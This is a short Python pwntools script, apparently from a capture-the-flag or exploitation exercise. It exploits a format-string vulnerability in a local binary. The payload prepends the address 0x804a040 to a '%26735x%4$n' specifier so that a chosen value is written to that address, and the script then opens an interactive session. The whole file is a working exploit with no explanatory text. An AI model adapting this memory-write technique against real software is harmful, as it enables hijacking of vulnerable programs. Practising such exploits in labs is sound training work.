from pwn import*

p = process('./Formatstring-write-command')

cmd = 0x804a040
payload = p32(cmd) + b"%26735x%4$n"

p.sendline(payload)
p.interactive()
